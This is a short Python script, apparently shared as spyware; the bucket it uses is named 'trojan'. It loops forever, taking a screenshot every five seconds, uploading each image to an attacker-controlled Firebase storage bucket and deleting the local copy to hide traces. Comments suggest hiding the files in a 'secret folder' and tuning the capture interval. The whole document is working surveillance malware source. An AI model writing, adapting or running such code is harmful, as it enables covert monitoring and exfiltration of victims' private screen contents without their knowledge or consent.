import firebase_admin
from firebase_admin import credentials, storage
import os, string, random
from pyautogui import screenshot
from time import sleep

name = os.name
key = {
  # your json key
}
cred = credentials.Certificate(key)
firebase_admin.initialize_app(cred)


def random_string(string_length=10):
  return ''.join(random.choice(string.ascii_lowercase) for i in range(string_length))

def send_to_firebase_storage(file_name):
    bucket = storage.bucket("trojan-697e9.appspot.com")
    blob = bucket.blob(file_name)
    blob.upload_from_filename(file_name)
    print("File uploaded to firebase storage")

def main():
    os.mkdir(name)
    while True:
      filename = name+"/"+random_string(string_length=15) + ".png"
      screenshot().save(filename)
      # change the file path if in windows . It is best to store it in a secret folder format
      send_to_firebase_storage(filename)
      os.remove(filename)
      sleep(5) # change the time interval (in seconds)

if __name__ == "__main__":
    main()